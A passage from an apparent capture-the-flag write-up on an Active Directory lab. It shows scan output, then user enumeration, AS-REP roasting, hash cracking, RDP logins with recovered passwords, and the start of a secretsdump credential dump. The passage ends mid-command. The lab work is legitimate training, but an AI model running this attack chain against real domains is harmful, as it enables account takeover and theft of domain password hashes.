Couldn&#039;t find any DOM based XSS.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc         Microsoft Windows RPC\n49679/tcp open  msrpc         Microsoft Windows RPC\n49684/tcp open  msrpc         Microsoft Windows RPC\n49695/tcp open  msrpc         Microsoft Windows RPC\n49823/tcp open  msrpc         Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=12/30%OT=53%CT=1%CU=35966%PV=Y%DS=4%DC=T%G=Y%TM=61CE7D\nOS:75%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS\nOS:=U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NN\nOS:S%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y\nOS:%DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD\nOS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%\nOS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD\nOS:=Z)\n\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-054: false\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT       ADDRESS\n1   34.37 ms  10.13.0.1\n2   ... 3\n4   183.65 ms 10.10.177.198\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Thu Dec 30 20:48:05 2021 -- 1 IP address (1 host up) scanned in 1890.41 seconds\n\nWe’ll use enum4linux to gather some additional information from the Samba shares (139/445) on the target.\nenum4linux 10.10.177.198\nThis produces a lot of noise (I’ve all of the output to STDERR below) as the target is fairly locked down. But there’s a few interesting things here.\nenum4linux v0.8.9 ( labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 30 20:55:33 2021\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... 10.10.177.198\nRID Range ........ 500-550,1000-1050\nUsername ......... &#039;&#039;\nPassword ......... &#039;&#039;\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n ===================================================== \n|    Enumerating Workgroup/Domain on 10.10.177.198    |\n ===================================================== \n[E] Can&#039;t find workgroup/domain\n\n ============================================= \n|    Nbtstat Information for 10.10.177.198    |\n ============================================= \nLooking up status of 10.10.177.198\nNo reply from 10.10.177.198\n\n ====================================== \n|    Session Check on 10.10.177.198    |\n ====================================== \n[+] Server 10.10.177.198 allows sessions using username &#039;&#039;, password &#039;&#039;\n[+] Got domain/workgroup name: \n\n ============================================ \n|    Getting domain SID for 10.10.177.198    |\n ============================================ \nDomain Name: THM-AD\nDomain Sid: S-1-5-21-3591857110-2884097990-301047963\n[+] Host is part of a domain (not a workgroup)\n\n ======================================= \n|    OS information on 10.10.177.198    |\n ======================================= \n[+] Got OS info for 10.10.177.198 from smbclient: \n[+] Got OS info for 10.10.177.198 from srvinfo:\nCould not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED\n\n ============================== \n|    Users on 10.10.177.198    |\n ============================== \n[E] Couldn&#039;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED\n\n[E] Couldn&#039;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED\n\n ========================================== \n|    Share Enumeration on 10.10.177.198    |\n ========================================== \ndo_connect: Connection to 10.10.177.198 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\n\n\tSharename       Type      Comment\n\t---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\nUnable to connect with SMB1 -- no workgroup available\n\n[+] Attempting to map shares on 10.10.177.198\n\n ===================================================== \n|    Password Policy Information for 10.10.177.198    |\n ===================================================== \n[E] Unexpected error from polenum:\n\n[+] Attaching to 10.10.177.198 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n\t[!] Protocol failed: Cannot request session (Called Name:10.10.177.198)\n\n[+] Trying protocol 445/SMB...\n\n\t[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.\n\n[E] Failed to get password policy with rpcclient\n\n =============================== \n|    Groups on 10.10.177.198    |\n =============================== \n\n[+] Getting builtin groups:\n\n[+] Getting builtin group memberships:\n\n[+] Getting local groups:\n\n[+] Getting local group memberships:\n\n[+] Getting domain groups:\n\n[+] Getting domain group memberships:\n\n ======================================================================== \n|    Users on 10.10.177.198 via RID cycling (RIDS: 500-550,1000-1050)    |\n ======================================================================== \n[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963\n[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833\n[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username &#039;&#039;, password &#039;&#039;\nS-1-5-21-3591857110-2884097990-301047963-500 THM-AD\\Administrator (Local User)\nS-1-5-21-3591857110-2884097990-301047963-501 THM-AD\\Guest (Local User)\nS-1-5-21-3591857110-2884097990-301047963-502 THM-AD\\krbtgt (Local User)\nS-1-5-21-3591857110-2884097990-301047963-503 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-504 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-505 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-506 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-507 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-508 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-509 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-510 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-511 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-512 THM-AD\\Domain Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-513 THM-AD\\Domain Users (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-514 THM-AD\\Domain Guests (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-515 THM-AD\\Domain Computers (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-516 THM-AD\\Domain Controllers (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-517 THM-AD\\Cert Publishers (Local Group)\nS-1-5-21-3591857110-2884097990-301047963-518 THM-AD\\Schema Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-519 THM-AD\\Enterprise Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-520 THM-AD\\Group Policy Creator Owners (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-521 THM-AD\\Read-only Domain Controllers (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-522 THM-AD\\Cloneable Domain Controllers (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-523 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-524 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-525 THM-AD\\Protected Users (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-526 THM-AD\\Key Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-527 THM-AD\\Enterprise Key Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-528 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-529 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-530 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-531 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-532 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-533 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-534 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-535 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-536 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-537 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-538 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-539 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-540 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-541 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-542 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-543 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-544 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-545 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-546 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-547 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-548 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-549 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-550 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\\ATTACKTIVEDIREC$ (Local User)\nS-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\\*unknown* (8)\n[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username &#039;&#039;, password &#039;&#039;\nS-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\\Administrator (Local User)\nS-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\\Guest (Local User)\nS-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\\DefaultAccount (Local User)\nS-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\\WDAGUtilityAccount (Local User)\nS-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\\None (Domain Group)\nS-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\\*unknown* (8)\n\n ============================================== \n|    Getting printer info for 10.10.177.198    |\n ============================================== \nCould not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED\n\nenum4linux complete on Thu Dec 30 21:05:30 2021\n\nThere’s honestly not much here, though we can see that the NETBIOS domain name for the target is THM-AD.\nThe AD domain itself is using the standard (invalid) .local TLD, but that’s not actually something that enum4linux tells us — instead, we can see this in the earlier output from Nmap.\nEnumerating users via Kerberos\nWe’ll now try to enumerate users using Kerbrute and the provided user list.\nkerbrute userenum --dc 10.10.177.198 \\\n                  --domain spookysec.local \\\n                  --output attacktive-director.kerbrute \\\n                           userlist.txt\nThis produces the following output.\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 12/30/21 - Ronnie Flathers @ropnop\n\n2021/12/30 21:12:56 &gt;  Using KDC(s):\n2021/12/30 21:12:56 &gt;   10.10.177.198:88\n\n2021/12/30 21:12:56 &gt;  [+] VALID USERNAME:       james@spookysec.local\n2021/12/30 21:12:59 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local\n2021/12/30 21:13:03 &gt;  [+] VALID USERNAME:       James@spookysec.local\n2021/12/30 21:13:05 &gt;  [+] VALID USERNAME:       robin@spookysec.local\n2021/12/30 21:13:20 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local\n2021/12/30 21:13:30 &gt;  [+] VALID USERNAME:       administrator@spookysec.local\n2021/12/30 21:13:49 &gt;  [+] VALID USERNAME:       backup@spookysec.local\n2021/12/30 21:13:58 &gt;  [+] VALID USERNAME:       paradox@spookysec.local\n2021/12/30 21:14:55 &gt;  [+] VALID USERNAME:       JAMES@spookysec.local\n2021/12/30 21:15:14 &gt;  [+] VALID USERNAME:       Robin@spookysec.local\n2021/12/30 21:17:10 &gt;  [+] VALID USERNAME:       Administrator@spookysec.local\n2021/12/30 21:20:59 &gt;  [+] VALID USERNAME:       Darkstar@spookysec.local\n2021/12/30 21:22:12 &gt;  [+] VALID USERNAME:       Paradox@spookysec.local\n2021/12/30 21:26:17 &gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local\n2021/12/30 21:27:26 &gt;  [+] VALID USERNAME:       ori@spookysec.local\n2021/12/30 21:29:37 &gt;  [+] VALID USERNAME:       ROBIN@spookysec.local\n2021/12/30 21:35:06 &gt;  Done! Tested 73317 usernames (16 valid) in 1330.206 seconds\n\nWe’ll be targeting the svc-admin and backup accounts. (These are supposed to “jump out” at me, but honestly I’m not sure why they’re more interesting than the other users, or administrator. Maybe because they’re not obviously people but also not the administrator account?)\nAbusing Kerberos\nWe’re going to try AS-REP Roasting using Impacket’s GetNPUsers.py script. We first create an attacktive-directory.targets file containing the following:\nsvc-admin\nbackup\n\nThen, we feed this to the GetNPUsers.py script.\npython3 \\\n/usr/share/doc/python3-impacket/examples/GetNPUsers.py \\\n-outputfile attacktive-directory.getnpusers \\\n-usersfile attacktive-directory.targets \\\n-dc-ip 10.10.177.198 spookysec.local/\nGetNPUsers.py reports that backup isn’t vulnerable to AS-REP roasting, but svc-admin is vulnerable and we get back a valid Hashcat password hash.\nA quick lookup in the Hashcat example hashes wiki page shows that this is a “Kerberos 5, etype 23, AS-REP” hash (Hashcat mode 18200). We’ll crack this using the provided password list.\nhashcat -m 18200 \\\n        -O attacktive-directory.getnpusers \\\n           passwordlist.txt\nThis reveals that the password for the svc-admin account is management2005.\nBefore moving on, we’ll connect to the target as svc-admin using XFreeRDP to get the first flag.\nxfreerdp /dynamic-resolution +clipboard /cert:ignore \\\n         /v:10.10.177.198 /u:svc-admin /p:management2005\nThis flag is in a file called user.txt on svc-admin’s desktop.\nBack to the basics\nWe’re going to drop down and use smbclient to enumerate potential shares on the target. This is where the NetBIOS domain name we discovered above comes in handy (we need to supply it with the -L switch).\nsmbclient -L THM-AD -I 10.10.177.198 \\\n          -U svc-admin%management2005\nWhich gives us the following output.\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        backup          Disk      \n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to THM-AD failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\nThere’s six shares, but only five of these are disks. We’ll poke around a bit using smbclient //THM-AD/${SHARENAME} -I 10.10.177.198 -U svc-admin%management2005; as one might guess, //THM-AD/backup contains a backup_credentials.txt file.\nThe contents of this file naively appear to be base64 encoded, and indeed piping it through base64 -d reveals that the password for the backup account is backup2517860.\nWe’ll again pause to connect to the target as backup to get the second flag.\nxfreerdp /dynamic-resolution +clipboard /cert:ignore \\\n         /v:10.10.177.198 /u:backup /p:backup2517860\nThis flag is in a file called PrivEsc on backup’s desktop.\nElevating privileges within the domain\nThe CTF now reveals that the backup account has all AD changes synced to it, including NT hashes, and that we can use Impacket’s secretsdump.py file to obtain these from NTDS.DIT.\npython3 \\\n/usr/share/doc/python3-impacket/examples/secretsdump.py \\\n-dc-ip 10.10.177.198 \\\n-target-ip 10.10.177.198 